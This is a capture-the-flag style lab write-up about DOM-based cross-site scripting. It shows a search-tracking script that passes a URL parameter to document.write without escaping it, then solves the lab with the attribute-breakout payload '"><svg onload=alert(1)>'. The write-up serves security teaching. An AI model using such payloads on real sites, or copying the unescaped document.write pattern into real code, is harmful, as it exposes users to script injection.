---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 3
---

![1](https://github.com/Knign/Write-ups/assets/110326359/43bb3632-e8c5-4e64-ba64-1af208d9a64c)

Let's insert the following payload in the search field:

```
test_payload
```

We can now open `Left CLick > Inspect` to open the developer tools and search our payload.

![2](https://github.com/Knign/Write-ups/assets/110326359/97e254cb-bd60-43fc-a1b7-1d72a50f9d49)

We can see that our payload has been inserted in the `<img>` tag more specifically, it has been appended to the source of the image.

Right above that we can see a `<script>` tag which includes the script responsible for the DOM manipulation:

```js
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms=' + query + '">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if (query) {
    trackSearch(query);
}
```

- The `trackSearch` function takes a `query` parameter and writes an image tag to the document, where the `src` attribute includes the search terms.
- The `query` variable is then assigned the value of the 'search' parameter from the URL using `URLSearchParams`.
- If the 'search' parameter exists in the URL, the `trackSearch` function is called with the obtained query.

Now that we know how the DOM manipulation works, we can insert our final payload into the application which will generate an alert.

```
"><svg onload=alert(1)>
```

![3](https://github.com/Knign/Write-ups/assets/110326359/75e0d58e-eaf5-446e-a6a7-c2fbc5e5e678)

We have solved the lab.

![5](https://github.com/Knign/Write-ups/assets/110326359/19d67d1d-053f-4644-9422-f1c901cf02a3)
